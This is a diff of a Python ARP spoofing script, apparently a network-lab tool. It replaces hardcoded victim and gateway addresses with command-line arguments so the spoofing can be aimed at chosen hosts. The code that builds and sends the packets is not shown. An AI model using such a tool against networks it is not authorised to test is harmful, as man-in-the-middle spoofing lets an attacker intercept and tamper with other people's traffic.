@@ -14,12 +14,12 @@ def get_args():
         parser.error("[-] MISSING PARAMETER '-g' (gateway IP), use --help for more info.")
     return options
 
-def ARPSpoof(n_times = 0):
+def ARPSpoof( victim_ip, gateway_ip, n_times = 0):
     attacker = User('192.168.56.103')
     attacker.get_mac()
-    victim = User('192.168.56.101')
+    victim = User(victim_ip)
     victim.get_mac()
-    gateway = User('192.168.56.102')
+    gateway = User(gateway_ip)
     gateway.get_mac()
     arp = ARP(attacker, victim, gateway)
     if n_times <= 0:
@@ -34,4 +34,4 @@ if __name__ == '__main__':
     options = get_args()
     target_ip = options.target_ip
     gateway_ip = options.gateway_ip
-    ARPSpoof()
+    ARPSpoof(target_ip, gateway_ip)
